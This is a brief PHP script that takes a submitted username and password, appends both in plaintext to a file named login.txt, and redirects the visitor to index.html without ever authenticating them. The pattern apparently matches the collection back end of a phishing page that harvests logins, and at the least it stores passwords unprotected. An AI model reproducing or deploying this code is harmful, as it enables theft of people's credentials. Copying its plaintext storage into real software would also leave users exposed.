<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Retrieve username and password
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Prepare the data to be saved
    $data = "Username: " . $username . "\nPassword: " . $password . "\n\n";

    // Save the data in login.txt file
    file_put_contents('login.txt', $data, FILE_APPEND);

    // Redirect back to the login page after submission
    header('Location: index.html');
    exit();
}
?>
